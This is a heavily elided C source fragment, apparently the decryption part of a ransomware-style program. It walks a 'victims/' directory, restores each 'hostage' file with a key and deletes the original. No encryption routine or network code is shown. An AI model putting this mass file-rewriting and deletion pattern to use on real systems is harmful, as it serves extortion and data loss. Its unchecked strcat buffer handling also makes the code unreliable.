...
void decrypt_file(const char *dir_name, const char *orig_filepath, const uint8_t *key,
                  size_t len_key) {
    char *bname;
    char *new_filepath;
    ...
    char *hostage = strdup(dir_name);
    hostage = strcat(hostage, bname);

    if (is_filename_proper(bname) != 0) {
        return;
    }

    if ((origfile_fd = open(hostage, O_RDONLY)) < 0) {
    ...
    new_filepath = strdup(hostage);
    strcat(new_filepath, RELEASED_EXT);
#ifdef DBG
    ...
    remove(hostage);  // Don't handle any errors
...
int main(int argc, char *argv[]) {
    ...
    char *victims = "victims/";
    char *victims_dir = dirname(victims);
    d = opendir(victims);
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            decrypt_file(victims, dir->d_name, (const uint8_t *)key, KEY_LEN);
        }
